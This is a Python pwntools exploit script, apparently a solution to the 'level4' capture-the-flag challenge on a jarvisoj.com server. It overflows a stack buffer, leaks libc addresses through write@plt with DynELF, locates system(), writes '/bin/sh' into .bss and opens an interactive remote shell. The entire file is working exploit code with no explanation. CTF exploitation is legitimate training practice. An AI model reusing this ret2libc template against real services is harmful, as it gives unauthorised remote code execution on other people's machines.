# -*- coding: utf-8 -*-

from pwn import *

elf = ELF('./level4')
plt_write = elf.symbols['write']
plt_read = elf.symbols['read']
vulfun_addr = 0x0804844b


def leak(address):
    payload1 = 'a' * 140 + p32(plt_write) + p32(vulfun_addr) + p32(1) + p32(address) + p32(4)
    p.send(payload1)
    data = p.recv(4)
    print "%#x => %s" % (address, (data or '').encode('hex'))
    return data

#p = process('./level4')
p = remote('pwn2.jarvisoj.com', 9880)

d = DynELF(leak, elf=ELF('./level4'))

system_addr = d.lookup('system', 'libc')
print "system_addr=" + hex(system_addr)

bss_addr = 0x0804a024
pppr = 0x08048509

payload2 = 'a'*140 + p32(plt_read) + p32(pppr) + p32(0) + p32(bss_addr) + p32(8)
payload2 += p32(system_addr) + p32(vulfun_addr) + p32(bss_addr)

p.send(payload2)
p.send('/bin/sh\x00')
p.interactive()

